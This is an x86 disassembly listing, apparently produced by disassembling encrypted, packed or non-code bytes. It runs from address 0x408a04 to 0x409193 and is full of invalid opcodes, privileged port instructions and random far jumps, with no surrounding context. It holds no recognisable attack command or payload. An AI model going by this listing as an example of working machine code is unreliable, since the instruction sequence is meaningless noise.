  408a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a05:	int    0x8d
  408a07:	pop    esi
  408a08:	sub    DWORD PTR [ebp-0x36c59dea],ebp
  408a0e:	pop    ebp
  408a0f:	push   edx
  408a10:	sbb    BYTE PTR [edi+eiz*4],cl
  408a13:	stc    
  408a14:	adc    cl,BYTE PTR [ecx-0x73]
  408a17:	dec    ecx
  408a18:	out    dx,eax
  408a19:	cli    
  408a1a:	daa    
  408a1b:	cmp    ah,BYTE PTR [ecx-0x6a]
  408a1e:	pop    ecx
  408a1f:	into   
  408a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a21:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  408a23:	jecxz  0x408a3b
  408a25:	pop    eax
  408a26:	dec    esi
  408a27:	mov    al,ds:0x638d6b3a
  408a2c:	push   edx
  408a2d:	jle    0x4089c8
  408a2f:	stc    
  408a30:	jle    0x408a0e
  408a32:	cdq    
  408a33:	pop    ebx
  408a34:	push   edi
  408a35:	jns    0x408aac
  408a37:	inc    ebp
  408a38:	repnz (bad) 
  408a3a:	jb     0x4089f9
  408a3c:	pusha  
  408a3d:	pop    ebx
  408a3e:	bnd ja 0x4089d4
  408a41:	xor    al,0x38
  408a43:	jnp    0x408a7d
  408a45:	jnp    0x408a4e
  408a47:	sahf   
  408a48:	or     BYTE PTR [ecx+0x29],0xe
  408a4c:	retf   0x8590
  408a4f:	aam    0x46
  408a51:	bound  edi,QWORD PTR [ecx]
  408a53:	repz fld QWORD PTR [ecx]
  408a56:	mov    al,0x7b
  408a58:	sub    eax,0xc9cd9d34
  408a5d:	inc    edx
  408a5e:	retf   
  408a5f:	adc    al,0xf8
  408a61:	cmp    eax,0xa314629f
  408a66:	jb     0x408a75
  408a68:	mov    ebx,0xf7181bd1
  408a6d:	inc    ebx
  408a6e:	lea    eax,ds:0x1db6f17f
  408a74:	mov    edx,0xc510d3fc
  408a79:	sbb    al,0x2d
  408a7b:	or     ebx,DWORD PTR [edx-0x31909545]
  408a81:	sub    al,0xa5
  408a83:	jmp    0x88f9:0x52757a03
  408a8a:	sbb    al,0x97
  408a8c:	imul   esp,DWORD PTR [eax+0x2b6b6934],0xf3b1353d
  408a96:	pop    eax
  408a97:	add    BYTE PTR [si],0xcc
  408a9b:	push   ds
  408a9c:	cdq    
  408a9d:	in     eax,dx
  408a9e:	push   edi
  408a9f:	mov    ds:0x2acead64,eax
  408aa4:	scas   al,BYTE PTR es:[edi]
  408aa5:	fistp  QWORD PTR [eax-0x1b]
  408aa8:	or     al,bl
  408aaa:	push   cs
  408aab:	xor    al,0x9d
  408aad:	call   0x49bfee3d
  408ab2:	ss pop eax
  408ab4:	sbb    al,0x43
  408ab6:	popa   
  408ab7:	jno    0x408b11
  408ab9:	mov    eax,ds:0x1562903f
  408abe:	aam    0xc2
  408ac0:	cmc    
  408ac1:	pop    esp
  408ac2:	adc    esp,ecx
  408ac4:	sbb    DWORD PTR [esi+ebp*2+0x56bcd258],eax
  408acb:	int3   
  408acc:	inc    ebp
  408acd:	(bad)  
  408ace:	and    eax,0x8cbcd886
  408ad3:	pop    ebp
  408ad4:	xchg   edx,eax
  408ad5:	mov    eax,ds:0x397f75c2
  408ada:	scas   eax,DWORD PTR es:[edi]
  408adb:	add    al,0xee
  408add:	js     0x408a8c
  408adf:	and    al,0x5f
  408ae1:	dec    ebx
  408ae2:	inc    edx
  408ae3:	inc    esi
  408ae4:	mov    eax,ds:0xe747069d
  408ae9:	xchg   edx,eax
  408aea:	add    eax,0x238cea75
  408aef:	lods   al,BYTE PTR ds:[esi]
  408af0:	cdq    
  408af1:	pop    ecx
  408af2:	aad    0xf7
  408af4:	xor    eax,0xbcaa2f8a
  408af9:	inc    eax
  408afa:	stos   BYTE PTR es:[edi],al
  408afb:	mov    esp,0xe18318a3
  408b00:	(bad)  
  408b01:	cld    
  408b02:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  408b04:	lea    esi,[ebx]
  408b06:	pop    edi
  408b07:	and    edx,DWORD PTR [esi+eax*1]
  408b0a:	ret    0x50c1
  408b0d:	xchg   ah,cl
  408b0f:	pusha  
  408b10:	mov    esp,0xa2d2ddd4
  408b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b16:	cmp    al,0x7a
  408b18:	mov    eax,ds:0xe0820e6d
  408b1d:	les    ecx,FWORD PTR [ebx]
  408b1f:	adc    ecx,DWORD PTR [edx]
  408b21:	push   ds
  408b22:	inc    ecx
  408b23:	fcomp  DWORD PTR [edi-0x18c04859]
  408b29:	fstp   QWORD PTR [esi+0x350b79b3]
  408b2f:	out    dx,al
  408b30:	push   0xbad05b8a
  408b35:	lods   eax,DWORD PTR ds:[esi]
  408b36:	push   ax
  408b38:	hlt    
  408b39:	outs   dx,DWORD PTR ds:[esi]
  408b3a:	xor    al,0xe9
  408b3c:	cwde   
  408b3d:	gs push edx
  408b3f:	add    eax,0x4cec3f6c
  408b44:	jmp    0x408bb2
  408b46:	(bad)  
  408b47:	mov    edi,0xd7802ee4
  408b4c:	cmc    
  408b4d:	cmp    DWORD PTR [ebx],0x6244c3b8
  408b53:	pop    ecx
  408b54:	jnp    0x408b83
  408b56:	bound  eax,QWORD PTR [edx]
  408b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b59:	jne    0x408b63
  408b5b:	mov    eax,0x2fd4556e
  408b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b61:	scas   eax,DWORD PTR es:[edi]
  408b62:	cmc    
  408b63:	(bad)  
  408b64:	scas   al,BYTE PTR es:[edi]
  408b65:	scas   eax,DWORD PTR es:[edi]
  408b66:	xchg   ecx,eax
  408b67:	call   0x6edc:0x4b2a4869
  408b6e:	adc    BYTE PTR [edx],ch
  408b70:	loop   0x408b75
  408b72:	das    
  408b73:	mov    ecx,0xaa5d7115
  408b78:	inc    ecx
  408b79:	pand   mm0,mm6
  408b7c:	pop    edi
  408b7d:	dec    esp
  408b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b80:	sub    cl,BYTE PTR [esp-0x30]
  408b84:	aaa    
  408b85:	mov    ebp,0x6d8145e2
  408b8a:	mov    al,0x25
  408b8c:	pop    es
  408b8d:	aad    0x88
  408b8f:	pop    es
  408b90:	rcl    dh,cl
  408b92:	(bad)
  408b95:	pop    edi
  408b96:	jns    0x408b6d
  408b98:	and    eax,0xb21f45c
  408b9d:	dec    esi
  408b9e:	cwde   
  408b9f:	rol    ebp,0x9
  408ba2:	cmp    bh,bl
  408ba4:	ror    edx,cl
  408ba6:	sbb    ecx,DWORD PTR [ebp-0x58cb26df]
  408bac:	prefetch BYTE PTR [ecx]
  408baf:	push   0xffffff8b
  408bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb2:	and    BYTE PTR [esi+0x44],ah
  408bb5:	pop    ecx
  408bb6:	mov    al,0x20
  408bb8:	jns    0x408bd4
  408bba:	pop    edi
  408bbb:	ret    0x226f
  408bbe:	pop    ebx
  408bbf:	and    DWORD PTR [esi+edi*1],edx
  408bc2:	push   ecx
  408bc3:	dec    ebp
  408bc4:	mov    al,ds:0x56583258
  408bc9:	mov    al,ds:0x7803dcb9
  408bce:	or     dl,0x76
  408bd1:	push   ebp
  408bd2:	jecxz  0x408c08
  408bd4:	shl    DWORD PTR [edx+0x67e1a7fb],cl
  408bda:	add    cl,BYTE PTR [edi+0x7d6dca28]
  408be0:	and    edi,ebp
  408be2:	fucomi st,st(1)
  408be4:	lock sub al,0x64
  408be7:	push   ds
  408be8:	jae    0x408bd2
  408bea:	add    esp,DWORD PTR [eax-0x4791f4c7]
  408bf0:	test   DWORD PTR [ebp-0x14de28a2],edx
  408bf6:	inc    esi
  408bf7:	xor    eax,0x88e34042
  408bfc:	mov    ebp,0xab3a108e
  408c01:	fild   DWORD PTR [esi]
  408c03:	stos   DWORD PTR es:[edi],eax
  408c04:	jne    0x408c6c
  408c06:	push   ecx
  408c07:	out    dx,eax
  408c08:	retf   0x61ce
  408c0b:	add    esi,DWORD PTR [ecx]
  408c0d:	jae    0x408bd5
  408c0f:	fmul   st,st(3)
  408c11:	dec    edx
  408c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c13:	add    edi,eax
  408c15:	adc    BYTE PTR [edx+0x5708046c],0xb5
  408c1c:	loop   0x408c89
  408c1e:	xor    DWORD PTR [ecx-0x27],eax
  408c21:	out    dx,eax
  408c22:	inc    ebx
  408c23:	adc    al,0x2b
  408c25:	mov    esi,0xba8c35ce
  408c2a:	call   0x78fc:0x468bcdc9
  408c31:	mov    eax,ds:0xbe6bbacc
  408c36:	ret    0x3bd8
  408c39:	inc    edi
  408c3a:	inc    edi
  408c3b:	add    al,0xb2
  408c3d:	jbe    0x408caf
  408c3f:	add    BYTE PTR [eax-0x6807abe3],0x98
  408c46:	sub    BYTE PTR [ebx+edi*8+0xf58d8c2],cl
  408c4d:	cs leave 
  408c4f:	push   eax
  408c50:	xchg   edi,eax
  408c51:	pop    edi
  408c52:	mov    bl,0x1b
  408c54:	dec    edx
  408c55:	dec    esp
  408c56:	iret   
  408c57:	(bad)  
  408c58:	or     eax,0x73d4b050
  408c5d:	test   BYTE PTR [ebx-0x3b],0xe7
  408c61:	jp     0x408c3a
  408c63:	mov    al,ds:0x3c4f1f55
  408c68:	cdq    
  408c69:	adc    bh,al
  408c6b:	inc    ecx
  408c6c:	sti    
  408c6d:	mov    BYTE PTR [ebx],bl
  408c6f:	push   esp
  408c70:	dec    ebp
  408c71:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408c73:	mov    BYTE PTR [eax+ecx*1-0x51d23412],bh
  408c7a:	cwde   
  408c7b:	scas   eax,DWORD PTR es:[edi]
  408c7c:	mov    BYTE PTR [esp+eiz*4-0x30],dh
  408c80:	mov    cl,0x6e
  408c82:	lods   al,BYTE PTR ds:[esi]
  408c83:	mov    dl,0x53
  408c85:	mov    ds:0xcdceb1c7,eax
  408c8a:	aaa    
  408c8b:	ret    
  408c8c:	and    edx,DWORD PTR [edx+0x76]
  408c8f:	jns    0x408c9c
  408c91:	fbstp  TBYTE PTR [ecx]
  408c93:	dec    ebx
  408c94:	dec    esi
  408c95:	(bad)  
  408c96:	aas    
  408c97:	and    dh,BYTE PTR [edx+0x267094cd]
  408c9d:	cmp    DWORD PTR [eax],ebx
  408c9f:	xor    bl,BYTE PTR [eax+0x40]
  408ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca3:	mov    ds:0xed8476e1,al
  408ca8:	icebp  
  408ca9:	out    dx,eax
  408caa:	jle    0x408d1b
  408cac:	jle    0x408c69
  408cae:	mov    ebx,0xb7084ac3
  408cb3:	adc    eax,0x55820387
  408cb8:	sub    BYTE PTR [ecx-0x72],dl
  408cbb:	test   DWORD PTR [ebx],ebx
  408cbd:	out    dx,al
  408cbe:	pusha  
  408cbf:	or     eax,0x5b9cd02f
  408cc4:	jb     0x408c6e
  408cc6:	ins    BYTE PTR es:[edi],dx
  408cc7:	(bad)  
  408cc8:	add    BYTE PTR [ecx+0x76d97852],0x57
  408ccf:	add    bh,BYTE PTR [edi]
  408cd1:	sti    
  408cd2:	push   ds
  408cd3:	add    dh,BYTE PTR [ebp+eiz*4+0x1af197e]
  408cda:	fsubr  st,st(6)
  408cdc:	jnp    0x408cca
  408cde:	or     ebp,0xffffffe9
  408ce1:	mov    WORD PTR [ebx+0x39],ss
  408ce4:	and    BYTE PTR [ecx-0x80],bl
  408ce7:	or     DWORD PTR [ebp-0x2b],ecx
  408cea:	jecxz  0x408ca5
  408cec:	(bad)  
  408ced:	ins    BYTE PTR es:[edi],dx
  408cee:	loopne 0x408cc5
  408cf0:	call   0xad75d70
  408cf5:	scas   eax,DWORD PTR es:[edi]
  408cf6:	or     BYTE PTR [edx+0x67],0xa4
  408cfa:	mov    DWORD PTR [ebx+0x59],ecx
  408cfd:	shld   DWORD PTR ds:0x65e961a3,ecx,cl
  408d04:	push   0xfb3e7270
  408d09:	cmp    al,0xde
  408d0b:	stos   DWORD PTR es:[edi],eax
  408d0c:	sti    
  408d0d:	out    0x57,al
  408d0f:	popa   
  408d10:	fld    QWORD PTR [ebp+0x41d71aee]
  408d16:	inc    ebp
  408d17:	mov    ecx,0x8ed85381
  408d1c:	(bad)  
  408d1d:	adc    ebx,DWORD PTR [ebp+0x1d]
  408d20:	repnz leave 
  408d22:	and    edi,esp
  408d24:	fwait
  408d25:	pop    ds
  408d26:	or     ecx,DWORD PTR [esi]
  408d28:	or     dl,BYTE PTR [edi-0x2f]
  408d2b:	jp     0x408cee
  408d2d:	cmp    DWORD PTR [edx-0x3b88d570],esp
  408d33:	xchg   DWORD PTR [edi+eax*2],ebp
  408d36:	add    al,0x57
  408d38:	loopne 0x408d71
  408d3a:	pop    ss
  408d3b:	jp     0x408d77
  408d3d:	add    WORD PTR gs:[edx+0x71c069d8],cx
  408d45:	fnstcw WORD PTR [esi-0x4e5c5973]
  408d4b:	dec    esp
  408d4c:	xchg   edx,eax
  408d4d:	int3   
  408d4e:	mov    edi,0x69cf25e3
  408d53:	out    dx,eax
  408d54:	test   eax,0x92132dd2
  408d59:	ret    0x7821
  408d5c:	div    bl
  408d5e:	out    dx,al
  408d5f:	adc    ebx,ebp
  408d61:	pop    DWORD PTR [esi+0x5]
  408d64:	sub    esp,DWORD PTR [ebp+0x5f]
  408d67:	lds    eax,FWORD PTR [edi]
  408d69:	loop   0x408d81
  408d6b:	or     dh,0xc6
  408d6e:	sbb    al,0xa0
  408d70:	mov    al,0xa8
  408d72:	pop    es
  408d73:	retf   0xce6e
  408d76:	aam    0xc3
  408d78:	jbe    0x408dde
  408d7a:	js     0x408d52
  408d7c:	pop    esi
  408d7d:	pop    ebp
  408d7e:	ds or  edx,eax
  408d81:	jmp    0x408dad
  408d83:	(bad)  
  408d84:	out    dx,eax
  408d85:	dec    eax
  408d86:	and    dl,dl
  408d88:	or     ebp,ebp
  408d8a:	arpl   WORD PTR [esi],bx
  408d8c:	mov    dl,0xd3
  408d8e:	sbb    dl,BYTE PTR [ebx+0x1]
  408d91:	push   eax
  408d92:	retf   
  408d93:	aas    
  408d94:	jno    0x408d94
  408d96:	push   gs
  408d98:	cmp    bl,BYTE PTR [eax]
  408d9a:	adc    BYTE PTR ds:0x380400d4,dh
  408da0:	(bad)  
  408da1:	(bad)  
  408da3:	and    al,0xcb
  408da5:	push   gs
  408da7:	repnz test al,0x3a
  408daa:	daa    
  408dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dac:	int    0x96
  408dae:	jae    0x408d69
  408db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db1:	(bad)  
  408db2:	mov    ebp,0xbcb61fa2
  408db7:	imul   ecx,DWORD PTR [esi+0xf482dd0],0xffffff9d
  408dbe:	stos   BYTE PTR es:[edi],al
  408dbf:	(bad)  
  408dc0:	xchg   BYTE PTR [ebx+0x180125c1],ch
  408dc6:	aad    0x8b
  408dc8:	add    eax,0x4269f20f
  408dcd:	je     0x408e38
  408dcf:	imul   ebx,ecx,0xaea9625c
  408dd5:	or     DWORD PTR [ebp-0x47],ebp
  408dd8:	shl    DWORD PTR [ebp+0x53],cl
  408ddb:	pop    esp
  408ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddd:	fisttp QWORD PTR [ebx]
  408ddf:	or     BYTE PTR [esi+edi*4-0x2a31f38c],cl
  408de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de7:	push   ds
  408de8:	xchg   esp,eax
  408de9:	pushf  
  408dea:	xchg   esi,eax
  408deb:	outs   dx,BYTE PTR ds:[esi]
  408dec:	adc    DWORD PTR [edx],0xea75b4ed
  408df2:	jmp    0xb02f:0x9d018492
  408df9:	and    cl,bl
  408dfb:	aam    0xa2
  408dfd:	mov    dl,0x77
  408dff:	or     BYTE PTR ds:0x99115ff2,ch
  408e05:	dec    edi
  408e06:	mov    edi,0xe8b8b062
  408e0b:	mov    ah,0x5
  408e0d:	push   0x9c184109
  408e12:	mov    ah,0xdf
  408e14:	iret   
  408e15:	pop    eax
  408e16:	mov    cl,0x2a
  408e18:	lock jmp 0x408df9
  408e1b:	xchg   edx,eax
  408e1c:	daa    
  408e1d:	out    0xea,eax
  408e1f:	in     eax,dx
  408e20:	in     al,dx
  408e21:	stos   BYTE PTR es:[edi],al
  408e22:	mov    edx,0x881d8066
  408e27:	mov    al,BYTE PTR [esp+eax*8-0x6220971]
  408e2e:	loopne 0x408e8f
  408e30:	ret    
  408e31:	push   0xfffffff6
  408e33:	jmp    0xf3fb:0xc51d10d9
  408e3a:	lods   eax,DWORD PTR ds:[esi]
  408e3b:	rcr    DWORD PTR [edi+0x2c],cl
  408e3e:	pushf  
  408e3f:	mov    edi,0x6b3ec275
  408e44:	les    eax,FWORD PTR [ebp-0x72]
  408e47:	xchg   ecx,eax
  408e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e49:	aam    0xb2
  408e4b:	jmp    0x408e25
  408e4d:	popa   
  408e4e:	mov    ebp,0x97f2dfb5
  408e53:	cs push ss
  408e55:	cmp    eax,0x2e6ec684
  408e5a:	mul    esi
  408e5c:	in     eax,0xfe
  408e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e5f:	popa   
  408e60:	test   DWORD PTR [ebx],edx
  408e62:	push   0x34eb527b
  408e67:	push   ss
  408e68:	cmp    DWORD PTR [edx],ebp
  408e6a:	ficomp WORD PTR [edi+0x7a]
  408e6d:	rcl    BYTE PTR [eax+0x52541454],cl
  408e73:	dec    ebx
  408e74:	sbb    DWORD PTR [ebx+0x1c],esi
  408e77:	call   FWORD PTR [edi]
  408e79:	ret    0x8852
  408e7c:	mov    ah,0xee
  408e7e:	mov    WORD PTR [esi+ecx*4-0x34144716],?
  408e85:	iret   
  408e86:	mov    dh,0x0
  408e88:	xchg   DWORD PTR [eax-0x2dfba73a],edx
  408e8e:	ror    DWORD PTR [eax+0x1],0x64
  408e92:	cmp    BYTE PTR [edx],ah
  408e94:	adc    ch,dl
  408e96:	out    0xcd,eax
  408e98:	retf   
  408e99:	aas    
  408e9a:	push   esi
  408e9b:	inc    ecx
  408e9c:	ja     0x408e95
  408e9e:	(bad)  
  408e9f:	ds jl  0x408ebb
  408ea2:	adc    al,0x5a
  408ea4:	rol    BYTE PTR [edx+0x57888d22],0x24
  408eab:	or     eax,0x6956c0b0
  408eb0:	sbb    al,0xfa
  408eb2:	pushf  
  408eb3:	loopne 0x408e75
  408eb5:	cmp    eax,0x1358e0df
  408eba:	jae    0x408eea
  408ebc:	sub    BYTE PTR [edx-0x23],dh
  408ebf:	pop    esi
  408ec1:	xchg   ebp,eax
  408ec2:	cld    
  408ec3:	inc    esi
  408ec4:	outs   dx,BYTE PTR ds:[esi]
  408ec5:	cmp    DWORD PTR [edi+eiz*8-0x5912ef06],ecx
  408ecc:	adc    DWORD PTR [ecx-0x37],edx
  408ecf:	sub    DWORD PTR [ecx+0x498a7a6],esi
  408ed5:	or     DWORD PTR [esi+esi*4],ebp
  408ed8:	fcomp  QWORD PTR gs:[edi+ebp*4]
  408edc:	inc    eax
  408edd:	push   esp
  408ede:	test   BYTE PTR [ebx],0xc1
  408ee1:	inc    esp
  408ee2:	fldenv [ebp-0x1a]
  408ee5:	stos   DWORD PTR es:[edi],eax
  408ee6:	sbb    al,0xff
  408ee8:	inc    esp
  408ee9:	mov    ebp,0x74c03b7
  408eee:	mov    ds:0x566089f3,al
  408ef3:	xchg   edi,eax
  408ef4:	inc    edi
  408ef5:	sub    eax,0x351bfcb1
  408efa:	and    al,0xe5
  408efd:	mov    eax,ds:0xd427ce25
  408f02:	out    0x4e,al
  408f04:	retf   0xc700
  408f07:	call   0xa24c:0x432ff75d
  408f0e:	pop    ecx
  408f0f:	xor    esp,DWORD PTR [edi+eax*4]
  408f12:	mov    esi,0x2749bcb7
  408f17:	pusha  
  408f18:	int3   
  408f19:	and    eax,0x57886193
  408f1e:	add    ch,BYTE PTR [esi+0x10bb8386]
  408f24:	addr16 xchg edx,eax
  408f26:	xor    ebp,DWORD PTR [esi+esi*1-0x7de67d8d]
  408f2d:	pop    edx
  408f2e:	sub    eax,0xc6740908
  408f33:	in     eax,dx
  408f34:	mov    ds:0x18fec5ce,al
  408f39:	jmp    0xf61bda23
  408f3e:	ins    BYTE PTR es:[edi],dx
  408f3f:	add    bh,dh
  408f41:	mov    eax,0x3c2584d9
  408f46:	mov    ch,0x12
  408f48:	sbb    eax,0x12488e1b
  408f4d:	popf   
  408f4e:	adc    BYTE PTR [esi-0xa0762a7],0x83
  408f55:	(bad)  
  408f57:	int    0x5b
  408f59:	dec    ebp
  408f5b:	sahf   
  408f5c:	and    edx,DWORD PTR [esi+0xb]
  408f5f:	outs   dx,BYTE PTR ds:[esi]
  408f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f61:	and    cl,BYTE PTR [ebx]
  408f63:	in     eax,dx
  408f64:	cwde   
  408f65:	icebp  
  408f66:	and    BYTE PTR [eax+0x4],cl
  408f69:	cmp    edx,DWORD PTR [ecx]
  408f6b:	add    al,0x17
  408f6d:	xchg   DWORD PTR [ecx-0x7912e7e0],edx
  408f73:	or     DWORD PTR [ecx+0x6a426fc4],edx
  408f79:	int    0xa5
  408f7b:	enter  0xde9e,0x2f
  408f7f:	ja     0x408fed
  408f81:	add    DWORD PTR [ebx-0x2961e43a],ebp
  408f87:	into   
  408f88:	cmp    bl,BYTE PTR [esi]
  408f8a:	cdq    
  408f8b:	jnp    0x408fd9
  408f8d:	sbb    eax,0x758e5905
  408f92:	xchg   esp,eax
  408f93:	xchg   esp,eax
  408f94:	repnz sbb DWORD PTR [esi+ebx*1+0x262506b5],0x5b138d7d
  408fa0:	lock lods al,BYTE PTR ds:[esi]
  408fa2:	xchg   edi,esi
  408fa4:	jmp    0x408f9d
  408fa6:	mov    DWORD PTR [ebp+0xf56c0],0xe8fe41f4
  408fb0:	out    dx,al
  408fb1:	pop    esi
  408fb2:	push   eax
  408fb3:	gs sbb al,0x8f
  408fb6:	iret   
  408fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb8:	fwait
  408fb9:	mov    ecx,0xe1bb1b3d
  408fbe:	cwde   
  408fbf:	rcl    BYTE PTR [edx-0x4b4b9eb],1
  408fc5:	arpl   ax,cx
  408fc7:	clc    
  408fc8:	adc    BYTE PTR [eax-0x6b772236],0x79
  408fcf:	in     al,dx
  408fd0:	repnz xchg esi,eax
  408fd2:	lods   eax,DWORD PTR ds:[esi]
  408fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fd4:	push   esp
  408fd5:	inc    edx
  408fd6:	aad    0xa1
  408fd8:	fcmovnbe st,st(6)
  408fda:	lods   eax,DWORD PTR ds:[esi]
  408fdb:	or     DWORD PTR [ebx],ebx
  408fdd:	neg    dl
  408fdf:	ins    BYTE PTR es:[edi],dx
  408fe0:	ins    BYTE PTR es:[edi],dx
  408fe1:	pop    eax
  408fe2:	sub    DWORD PTR [ecx+0x4d],edx
  408fe5:	loopne 0x408fd5
  408fe7:	sbb    dl,BYTE PTR [ecx+0x619dd211]
  408fed:	inc    edi
  408fee:	es pop esi
  408ff0:	rol    DWORD PTR [ebx],1
  408ff2:	fs push ebp
  408ff4:	div    BYTE PTR [ecx-0x176db4b2]
  408ffa:	fnstcw WORD PTR [ebx+edi*8-0x67]
  408ffe:	add    al,0x25
  409000:	cwde   
  409001:	arpl   bp,sp
  409003:	or     DWORD PTR [ecx*1-0x7860a4d3],edi
  40900a:	dec    edx
  40900b:	outs   dx,DWORD PTR ds:[esi]
  40900c:	shld   DWORD PTR fs:[ebx+0x1d],edx,0xcd
  409012:	out    dx,al
  409013:	sub    cl,dl
  409015:	pushf  
  409016:	out    dx,eax
  409017:	xor    esp,ebx
  409019:	cs popa 
  40901b:	les    ebp,FWORD PTR [ecx]
  40901d:	aam    0x57
  40901f:	rol    ecx,0xd0
  409022:	aas    
  409023:	and    DWORD PTR [eax+0x4e400819],ebx
  409029:	xchg   BYTE PTR [ebp+0x21],ch
  40902c:	ret    
  40902d:	mov    ds,WORD PTR [ebx+0x22]
  409030:	test   al,0x99
  409032:	fild   QWORD PTR [edx+0xc]
  409035:	lods   al,BYTE PTR ds:[esi]
  409036:	cmp    ch,BYTE PTR [ebp+esi*1+0x6]
  40903a:	loope  0x40900e
  40903c:	mov    ecx,0xecf7a20d
  409041:	imul   esp,DWORD PTR [ebp-0x352fdd68],0xa450a53b
  40904b:	pop    ecx
  40904c:	jo     0x409002
  40904e:	std    
  40904f:	fdiv   QWORD PTR [ecx-0x24]
  409052:	cwde   
  409053:	das    
  409054:	ret    0xce35
  409057:	mov    cl,0x68
  409059:	aam    0xa4
  40905b:	mov    al,0x1b
  40905d:	hlt    
  40905e:	ds icebp 
  409060:	and    eax,DWORD PTR ds:0x3a2b6d1a
  409066:	je     0x409003
  409068:	cmp    ebx,ebp
  40906a:	call   0x2d52:0x5970a479
  409071:	jg     0x40904d
  409073:	sahf   
  409074:	sub    ch,BYTE PTR [esi-0x2e]
  409077:	hlt    
  409078:	fistp  QWORD PTR [ecx]
  40907a:	add    ebx,ebx
  40907c:	cmp    BYTE PTR [ebp+0x31bc8969],dh
  409082:	retf   
  409083:	int3   
  409084:	mov    esp,0x73e84d97
  409089:	aas    
  40908a:	sbb    BYTE PTR [edi-0x1c009f2d],bl
  409090:	xor    BYTE PTR gs:[edx-0x3f],dl
  409094:	mov    DWORD PTR [edi],ecx
  409096:	push   edx
  409097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409098:	mov    ds:0xcc4e0768,al
  40909d:	ror    BYTE PTR [eax+0x2225869f],1
  4090a3:	repz fisub WORD PTR [ebx+0x6394c4da]
  4090aa:	out    0xd7,eax
  4090ac:	and    al,0xaa
  4090ae:	adc    dl,BYTE PTR [ebp+0x696c0048]
  4090b4:	(bad)  
  4090b5:	sub    al,ch
  4090b7:	push   0xffffff91
  4090b9:	ins    BYTE PTR es:[edi],dx
  4090ba:	call   0x6c30d9e7
  4090bf:	call   0x8ba247b2
  4090c4:	xchg   DWORD PTR [ebp+0x76],ecx
  4090c7:	push   esp
  4090c8:	xor    dl,dh
  4090ca:	jnp    0x409128
  4090cc:	scas   al,BYTE PTR es:[edi]
  4090cd:	jae    0x409112
  4090cf:	push   ebx
  4090d0:	ss pop edi
  4090d2:	xchg   esp,eax
  4090d3:	pop    ecx
  4090d4:	and    esp,DWORD PTR [eax]
  4090d6:	add    BYTE PTR [esi-0x5e],0x7
  4090da:	push   DWORD PTR [ebp+ebx*1+0x45]
  4090de:	inc    ecx
  4090df:	jae    0x409065
  4090e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090e2:	out    0xdb,al
  4090e4:	in     eax,0xaf
  4090e6:	fs int3 
  4090e8:	jp     0x40908f
  4090ea:	and    bh,BYTE PTR [ecx-0x43f363d7]
  4090f0:	outs   dx,BYTE PTR ds:[esi]
  4090f1:	loope  0x40908f
  4090f3:	ror    BYTE PTR [esi+ebx*1+0xa],0x25
  4090f8:	div    BYTE PTR [eax+0x7c]
  4090fb:	lea    eax,[ebp-0x4675216c]
  409101:	fdiv   QWORD PTR [edx]
  409103:	inc    ecx
  409104:	data16 test BYTE PTR [ecx],dl
  409107:	mov    ds:0xee6d9ae,al
  40910c:	pop    ecx
  40910d:	aas    
  40910e:	push   es
  40910f:	repz push ds
  409111:	adc    BYTE PTR [esi+0xd19d3cc],dl
  409117:	add    DWORD PTR [eax+0x55],ebx
  40911a:	inc    ebp
  40911b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40911c:	and    eax,0x8ba7ca5d
  409121:	test   dh,bl
  409123:	data16 add ch,BYTE PTR [edx]
  409126:	test   BYTE PTR [edi-0x54],bh
  409129:	sub    eax,DWORD PTR [edi+edi*2+0x6a]
  40912d:	jbe    0x4090d0
  40912f:	xchg   dh,dl
  409131:	dec    ebp
  409132:	les    ebx,FWORD PTR [esi]
  409134:	js     0x4090be
  409136:	inc    edi
  409137:	and    BYTE PTR [ebp+0x8b0a5be],dh
  40913d:	add    al,0x9
  40913f:	cmp    BYTE PTR [edx],0x37
  409142:	fistp  WORD PTR [edx-0x7b]
  409145:	or     eax,0xc4b2df5c
  40914a:	sti    
  40914b:	push   edi
  40914c:	(bad)  
  40914d:	out    dx,eax
  40914e:	imul   al
  409150:	lods   al,BYTE PTR ds:[esi]
  409151:	shl    DWORD PTR [edi-0x65],0x96
  409155:	jg     0x40919d
  409157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409158:	or     BYTE PTR [eax],0xd8
  40915b:	cmp    DWORD PTR [edi-0x653ec5ae],ecx
  409161:	xchg   edx,eax
  409162:	and    BYTE PTR [edx-0x3e7ade16],ch
  409168:	fdiv   DWORD PTR [ebx+0x211104e9]
  40916e:	shl    BYTE PTR [edi+eiz*4+0x2a530a28],0xb7
  409176:	mov    edx,0x7d3b637f
  40917b:	fcom   QWORD PTR [edi-0x38d0b0cc]
  409181:	(bad)  
  409182:	xor    al,0x9c
  409184:	ror    BYTE PTR [eax],0x8f
  409187:	test   BYTE PTR [edx-0x80],al
  40918a:	jbe    0x4091fa
  40918c:	pop    ds
  40918d:	pop    ds
  40918e:	mov    ah,0xf0
  409190:	or     al,0xd0
  409192:	push   edx
  409193:	fadd   st,st(0)
